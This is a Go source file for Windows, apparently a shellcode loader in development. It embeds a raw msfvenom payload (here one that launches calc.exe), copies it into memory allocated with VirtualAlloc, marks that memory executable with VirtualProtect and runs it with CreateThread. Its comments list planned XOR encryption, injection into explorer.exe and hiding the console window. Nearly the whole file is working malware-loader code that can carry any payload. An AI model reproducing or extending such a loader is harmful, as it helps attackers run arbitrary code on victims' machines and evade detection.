package main

import (
	"fmt"
	"unsafe"
	_ "embed"
	"golang.org/x/sys/windows"
)

var (
	kernel32DLL   = windows.NewLazySystemDLL("kernel32.dll")
	RtlMoveMemory = kernel32DLL.NewProc("RtlMoveMemory")
	CreateThread  = kernel32DLL.NewProc("CreateThread")
)

//go:embed sc.bin
//msfvenom -p windows/x64/exec CMD='cmd.exe /c calc.exe' -f raw
var sc []byte 

func main() {
	// objectives:
	// embed encrypted shellcode from file into program
	// decrypt shellcode (XOR)
	// inject shellcode into explorer.exe
	// get rid of console window (pop up)

	// Allocate a memory buffer for the payload
	addr, err := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(sc)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)

	if err != nil {
		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
	}

	// Copy payload to the new buffer
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))

	var oldProtect uint32

	//Make the new buffer executable
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err))
	}

	// Send it
	thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	if err.Error() != "The operation completed successfully." {
		panic(fmt.Sprintf("[!] CreateThread(): %s", err.Error()))
	}

	// Wait forever
	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)

}
